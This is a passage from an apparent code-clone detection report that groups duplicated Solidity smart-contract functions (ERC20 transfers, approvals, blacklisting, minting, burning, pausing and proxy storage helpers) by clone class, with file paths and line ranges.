  function transfer(address _to, uint256 _value) public returns (bool) {
    require(tokenBlacklist[msg.sender] == false);
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    // SafeMath.sub will throw if there is not enough balance.
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="129" endline="139" pcid="5991">
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(tokenBlacklist[msg.sender] == false);
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    // SafeMath.sub will throw if there is not enough balance.
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
</source>
</class>

<class classid="246" nclones="2" nlines="11" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="144" endline="155" pcid="5124">
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(tokenBlacklist[msg.sender] == false);
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="146" endline="157" pcid="5993">
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(tokenBlacklist[msg.sender] == false);
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
</source>
</class>

<class classid="247" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="170" endline="174" pcid="5127">
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="172" endline="176" pcid="5996">
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
</source>
</class>

<class classid="248" nclones="2" nlines="11" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="176" endline="185" pcid="5128">
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="178" endline="187" pcid="5997">
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
</source>
</class>

<class classid="249" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="189" endline="194" pcid="5129">
  function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
	require(tokenBlacklist[_address] != _isBlackListed);
	tokenBlacklist[_address] = _isBlackListed;
	emit Blacklist(_address, _isBlackListed);
	return true;
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="191" endline="196" pcid="5998">
  function _blackList(address _address, bool _isBlackListed) internal returns (bool) {
	require(tokenBlacklist[_address] != _isBlackListed);
	tokenBlacklist[_address] = _isBlackListed;
	emit Blacklist(_address, _isBlackListed);
	return true;
  }
</source>
</class>

<class classid="250" nclones="8" nlines="3" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="202" endline="204" pcid="5130">
  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transfer(_to, _value);
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="210" endline="212" pcid="5132">
  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
    return super.approve(_spender, _value);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="204" endline="206" pcid="5999">
  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transfer(_to, _value);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="212" endline="214" pcid="6001">
  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
    return super.approve(_spender, _value);
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="681" endline="683" pcid="8133">
    function transfer(address to, uint256 value) public whenNotPaused returns (bool) {
        return super.transfer(to, value);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="689" endline="691" pcid="8135">
    function approve(address spender, uint256 value) public whenNotPaused returns (bool) {
        return super.approve(spender, value);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="693" endline="695" pcid="8136">
    function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
        return super.increaseAllowance(spender, addedValue);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="697" endline="699" pcid="8137">
    function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
        return super.decreaseAllowance(spender, subtractedValue);
    }
</source>
</class>

<class classid="251" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="206" endline="208" pcid="5131">
  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="208" endline="210" pcid="6000">
  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="685" endline="687" pcid="8134">
    function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {
        return super.transferFrom(from, to, value);
    }
</source>
</class>

<class classid="252" nclones="4" nlines="3" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="214" endline="216" pcid="5133">
  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {
    return super.increaseApproval(_spender, _addedValue);
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="218" endline="220" pcid="5134">
  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {
    return super.decreaseApproval(_spender, _subtractedValue);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="220" endline="222" pcid="6003">
  function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {
    return super.decreaseApproval(_spender, _subtractedValue);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="216" endline="218" pcid="6002">
  function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {
    return super.increaseApproval(_spender, _addedValue);
  }
</source>
</class>

<class classid="253" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="222" endline="224" pcid="5135">
  function blackListAddress(address listAddress,  bool isBlackListed) public whenNotPaused onlyOwner  returns (bool success) {
	return super._blackList(listAddress, isBlackListed);
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="224" endline="226" pcid="6004">
  function blackListAddress(address listAddress,  bool isBlackListed) public whenNotPaused onlyOwner  returns (bool success) {
	return super._blackList(listAddress, isBlackListed);
  }
</source>
</class>

<class classid="254" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="251" endline="257" pcid="5137">
	function _burn(address _who, uint256 _value) internal {
		require(_value <= balances[_who]);
		balances[_who] = balances[_who].sub(_value);
		totalSupply = totalSupply.sub(_value);
		emit Burn(_who, _value);
		emit Transfer(_who, address(0), _value);
	}
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="252" endline="258" pcid="6006">
	function _burn(address _who, uint256 _value) internal {
		require(_value <= balances[_who]);
		balances[_who] = balances[_who].sub(_value);
		totalSupply = totalSupply.sub(_value);
		emit Burn(_who, _value);
		emit Transfer(_who, address(0), _value);
	}
</source>
</class>

<class classid="255" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="259" endline="265" pcid="5138">
    function mint(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Mint(address(0), account, amount);
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="260" endline="266" pcid="6007">
    function mint(address account, uint256 amount) onlyOwner public {

        totalSupply = totalSupply.add(amount);
        balances[account] = balances[account].add(amount);
        emit Mint(address(0), account, amount);
        emit Transfer(address(0), account, amount);
    }
</source>
</class>

<class classid="256" nclones="2" nlines="5" similarity="75">
<source file="systems/source-code/0x9a38915bb3e257c2e3cc45b6f674922c8bd1c2f7.sol" startline="34" endline="39" pcid="5619">
    function approveWallet(address _wallet) public {
        require(msg.sender == operator, "!operator");
        wallets[_wallet] = true;

        emit ApproveWallet(_wallet);
    }
</source>
<source file="systems/source-code/0x9a38915bb3e257c2e3cc45b6f674922c8bd1c2f7.sol" startline="40" endline="45" pcid="5620">
    function revokeWallet(address _wallet) external {
        require(msg.sender == operator, "!operator");
        wallets[_wallet] = false;

        emit RevokeWallet(_wallet);
    }
</source>
</class>

<class classid="257" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="47" endline="49" pcid="6438">
    function setOwner2(address _owner) public onlyOwner{
        _owner2 = _owner;
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="43" endline="45" pcid="6878">
    function transferOwnership(address newOwner) external onlyOwner {
        owner = newOwner;
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="85" endline="87" pcid="7132">
     function transferOwnership(address _newOwner) public onlyOwner {
         newOwner = _newOwner;
     }
</source>
</class>

<class classid="258" nclones="7" nlines="3" similarity="100">
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="162" endline="164" pcid="6449">
    function setPrivateSalePrice(uint _privateSalePriceInWei) public onlyOwner {
        privateSalePriceInWei = _privateSalePriceInWei;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="178" endline="180" pcid="6453">
    function setPrivateSaleCurrentSalesCount(uint _privateSaleCurrentSalesCount) public onlyOwner {
        privateSaleCurrentSalesCount = _privateSaleCurrentSalesCount;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="166" endline="168" pcid="6450">
    function setPrivateSaleMaxCount(uint _privateSaleMaxSalesCount) public onlyOwner {
        privateSaleMaxSalesCount = _privateSaleMaxSalesCount;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="198" endline="200" pcid="6456">
    function setPublicSaleSecondsBetweenStages(uint _publicSaleSecondsBetweenStages) public onlyOwner {
        publicSaleSecondsBetweenStages = _publicSaleSecondsBetweenStages;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="202" endline="204" pcid="6457">
    function setPublicSaleMaxCount(uint _publicSaleMaxSalesCount) public onlyOwner {
        publicSaleMaxSalesCount = _publicSaleMaxSalesCount;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="214" endline="216" pcid="6460">
    function setPublicSaleCurrentSalesCount(uint _publicSaleCurrentSalesCount) public onlyOwner {
        publicSaleCurrentSalesCount = _publicSaleCurrentSalesCount;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="218" endline="220" pcid="6461">
    function setBatchSize(uint _size) public onlyOwner {
        batchSize = _size;
    }
</source>
</class>

<class classid="259" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="170" endline="172" pcid="6451">
    function pausePrivateSale() public onlyOwner {
        isPrivateSaleRunning = false;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="206" endline="208" pcid="6458">
    function pausePublicSale() public onlyOwner {
        isPublicSaleRunning = false;
    }
</source>
</class>

<class classid="260" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="241" endline="243" pcid="6465">
    function getAllOwnerAddresses() public view returns (address[] memory) {
        return presaleOwners;
    }
</source>
<source file="systems/source-code/0xb260dc1c98d1192c92f338e7e533667648dbf37e.sol" startline="74" endline="76" pcid="6528">
    function getRegisteredTokens() external view returns (address[] memory) {
        return registeredTokenList;
    }
</source>
</class>

<class classid="261" nclones="3" nlines="5" similarity="100">
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="66" endline="70" pcid="7116">
  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="63" endline="67" pcid="8974">
  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="64" endline="68" pcid="8059">
  function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {
    for (uint256 i = 0; i < receivers.length; i++) {
      transfer(receivers[i], amounts[i]);
    }
  }
</source>
</class>

<class classid="262" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0xc936fb76df2d8a030d8030f984f4c3510be0d96e.sol" startline="52" endline="54" pcid="7178">
    function getCurrentBlockTimestamp() public view returns (uint256 timestamp) {
        timestamp = block.timestamp;
    }
</source>
<source file="systems/source-code/0xc936fb76df2d8a030d8030f984f4c3510be0d96e.sol" startline="55" endline="57" pcid="7179">
    function getCurrentBlockDifficulty() public view returns (uint256 difficulty) {
        difficulty = block.difficulty;
    }
</source>
<source file="systems/source-code/0xc936fb76df2d8a030d8030f984f4c3510be0d96e.sol" startline="58" endline="60" pcid="7180">
    function getCurrentBlockGasLimit() public view returns (uint256 gaslimit) {
        gaslimit = block.gaslimit;
    }
</source>
</class>

<class classid="263" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0xcE834FaC091Ce0Ce3CA9845dd89108f6ca5bb335.sol" startline="59" endline="64" pcid="7351">
  function implementation() public view returns (address impl) {
    bytes32 position = implementationPosition;
    assembly {
      impl := sload(position)
    }
  }
</source>
<source file="systems/source-code/0xcE834FaC091Ce0Ce3CA9845dd89108f6ca5bb335.sol" startline="123" endline="128" pcid="7355">
  function proxyOwner() public view returns (address owner) {
    bytes32 position = proxyOwnerPosition;
    assembly {
      owner := sload(position)
    }
  }
</source>
</class>

<class classid="264" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0xcE834FaC091Ce0Ce3CA9845dd89108f6ca5bb335.sol" startline="70" endline="75" pcid="7352">
  function setImplementation(address newImplementation) internal {
    bytes32 position = implementationPosition;
    assembly {
      sstore(position, newImplementation)
    }
  }
</source>
<source file="systems/source-code/0xcE834FaC091Ce0Ce3CA9845dd89108f6ca5bb335.sol" startline="133" endline="138" pcid="7356">
  function setUpgradeabilityOwner(address newProxyOwner) internal {
    bytes32 position = proxyOwnerPosition;
    assembly {
      sstore(position, newProxyOwner)
    }
  }
</source>
</class>

<class classid="265" nclones="2" nlines="8" similarity="100">
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="53" endline="62" pcid="8058">
  function transfer(address to, uint256 value) public override returns (bool) {
    require(value <= balances[msg.sender]);
    require(to != address(0));

    balances[msg.sender] = balances[msg.sender].sub(value);
    balances[to] = balances[to].add(value);

    emit Transfer(msg.sender, to, value);
    return true;
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="52" endline="61" pcid="8973">
  function transfer(address to, uint256 value) public override returns (bool) {
    require(value <= balances[msg.sender]);
    require(to != address(0));

    balances[msg.sender] = balances[msg.sender].sub(value);
    balances[to] = balances[to].add(value);

    emit Transfer(msg.sender, to, value);
    return true;
  }
</source>
</class>

<class classid="266" nclones="2" nlines="10" similarity="100">
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="77" endline="89" pcid="8061">
  function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    require(value <= balances[from]);
    require(value <= allowed[from][msg.sender]);
    require(to != address(0));

    balances[from] = balances[from].sub(value);
    balances[to] = balances[to].add(value);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, value);
    return true;
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="76" endline="88" pcid="8976">
  function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    require(value <= balances[from]);
    require(value <= allowed[from][msg.sender]);
    require(to != address(0));

    balances[from] = balances[from].sub(value);
    balances[to] = balances[to].add(value);

    allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);

    emit Transfer(from, to, value);
    return true;
  }
</source>
</class>

<class classid="267" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="579" endline="582" pcid="8128">
    function _addPauser(address account) internal {
        _pausers.add(account);
        emit PauserAdded(account);
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="584" endline="587" pcid="8129">
    function _removePauser(address account) internal {
        _pausers.remove(account);
        emit PauserRemoved(account);
    }
</source>
</class>

<class classid="268" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="62" endline="65" pcid="8563">
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="169" endline="172" pcid="8631">
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
</source>
</class>

<class classid="269" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="204" endline="207" pcid="8575">
    function setTokenFee(uint _tokenSendFee) public onlyOwner returns(bool success){
        tokenSendFee = _tokenSendFee;
        return true;
    }
</source>
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="209" endline="212" pcid="8576">
    function setEthFee(uint _ethSendFee) public onlyOwner returns(bool success){
        ethSendFee = _ethSendFee;
        return true;
    }
</source>
</class>

<class classid="270" nclones="2" nlines="7" similarity="100">
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="92" endline="99" pcid="8963">
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="92" endline="99" pcid="9007">
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }
</source>
</class>

<class classid="271" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="101" endline="104" pcid="8964">
    function mint(address account, uint256 amount) public onlyOwner returns (bool) {
        _mint(account, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="101" endline="104" pcid="9008">
    function mint(address account, uint256 amount) public onlyOwner returns (bool) {
        _mint(account, amount);
        return true;
    }
</source>
</class>

<class classid="272" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="129" endline="135" pcid="8968">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="129" endline="135" pcid="9012">
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
</source>
</class>

<class classid="273" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="413" endline="416" pcid="9257">
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="432" endline="435" pcid="9259">
  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
</source>
</class>

</clones>
